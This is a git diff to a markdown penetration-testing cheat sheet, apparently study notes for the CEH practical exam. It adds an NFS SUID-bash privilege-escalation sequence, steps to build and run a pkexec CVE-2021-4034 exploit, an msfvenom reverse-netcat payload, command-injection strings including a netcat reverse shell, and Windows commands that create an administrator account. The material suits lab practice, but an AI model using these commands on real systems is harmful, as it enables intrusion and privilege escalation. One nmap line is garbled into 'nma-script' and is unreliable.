@@ -91,7 +91,7 @@ Examples:
 - `nmap -sP IP/range`
 - `nmap -sS -sV -O 172.20.0.*`
 - `nmap -sS -sV -sC -A -O 172.20.0.*`
-- `nmap --script vuln 172.20.0.*`
+- `nma-script vuln 172.20.0.*`
 - `nmap -vv -T4 -A -oN ff.txt 10.10.183.* -p8012`
 
 | **Option** | **Description**                                                                 |
@@ -607,7 +607,18 @@ LDAP enumeration allows you to gather information about usernames, addresses, de
 - `sudo nmap --script nfs* IP -sV -p111,2049`
 
 > Show available NFS shares
+- `sudo apt install nfs-common`
 - `showmount -e IP`
+
+- `cp /bin/bash .`
+- `chmod +s bash`
+- `ls -la bash `
+
+* cd /home
+* ls
+* ./bash -p
+* id
+* whoami
 
 > Mounting NFS share
 - `mkdir directory`
@@ -977,6 +988,10 @@ Is a tool for enumerating information from Windows and Samba systems. It is used
 ## <span style="color: #3498db; font-size: 0.8em;">  Polkit or Policykit</span>
 
 > pkexec cve-2021-4034
+>polkit
+- `https://github.com/arthepsy/CVE-2021-4034`
+- `gcc cve-2021-4034-poc.c -o exploit`
+- `./exploit`
 
 
 ## <span style="color: #3498db; font-size: 0.8em;">  Modified Data</span>
@@ -1719,6 +1734,10 @@ If the domain has different IPs associated with it, it has a balancer.
 - `use exploit/multi/handler`
 - `set payload php/meterpreter/reverse_tcp`
 
+>  msfvenom reverce telnet
+- `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
+
+
 > Change the extension
 - For example: .php.jpg
 
@@ -2110,3 +2129,27 @@ Interesting URL:
 * https://medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9
 * https://immpetus.gitbook.io/ceh-practical/
 * https://ceh-practical.cavementech.com/
+
+
+## <span style="color: #3498db; font-size: 0.8em;"> command injection Linux </span>
+
+- 127.0.0.1 && ls
+- 127.0.0.1 & ls
+- 127.0.0.1 ; ls
+- 127.0.0.1 | ls
+- 127.0.0.1 && nc -c sh 127.0.0.1 9001
+
+## <span style="color: #3498db; font-size: 0.8em;"> command injection Windows </span>
+
+-intental poner en algunos casos | primero ejemplo |hostname o | hostname 
+- hostname
+- whoami
+- tasklist
+- taskkill /PID 3112 /F   //forcefully kills the processes
+- dir c:\
+- net user
+- net user test /add     //add a new user
+- net localgroup Administrators test /add    //add test user to administrators
+- net user test     //to view the details of the user
+- dir c:\ "pin.txt" or this command ! Take pin.txt   //to get content
+- type c:\"pin.txt“   //to get the content of a file
